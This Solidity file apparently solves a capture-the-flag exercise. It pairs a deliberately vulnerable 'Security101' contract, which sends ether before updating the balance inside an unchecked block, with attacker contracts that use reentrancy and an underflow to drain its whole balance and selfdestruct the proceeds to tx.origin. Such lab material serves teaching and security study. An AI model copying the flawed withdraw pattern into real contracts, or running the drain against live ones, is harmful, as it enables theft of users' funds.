// SPDX-License-Identifier: AGPL-3.0
pragma solidity ^0.8.15;
import "forge-std/console.sol";

contract Security101 {
    mapping(address => uint256) balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, 'insufficient funds');
        (bool ok, ) = msg.sender.call{value: amount}('');
        require(ok, 'transfer failed');
        unchecked {
            balances[msg.sender] -= amount;
        }
    }
}

// https://ethereum.stackexchange.com/questions/29469/is-addressthis-a-valid-address-in-a-contracts-constructor
// in order to `receive` callback, we have to add a new contract and attack outside constructor
contract AttackerMiddle {
    constructor(address token) payable {
        Security101(token).deposit{value: msg.value}();
    }

    function attack(address token, uint i) public payable {
        Security101(token).withdraw(i);
    }

    fallback() external payable {
        if (msg.value == address(this).balance) {
            attack(msg.sender, msg.value);
        } else if (msg.sender.balance == 0) {
            selfdestruct(payable(tx.origin));
        }
    }
}

// when selfdestruct, nothing would write to code, saving gas.
contract OptimizedAttackerSecurity101 {
    constructor(address token) payable {
        AttackerMiddle tmp = new AttackerMiddle{value: msg.value}(token);
        tmp.attack(token, msg.value);
        tmp.attack(token, token.balance);
        selfdestruct(payable(tx.origin));
    }
}
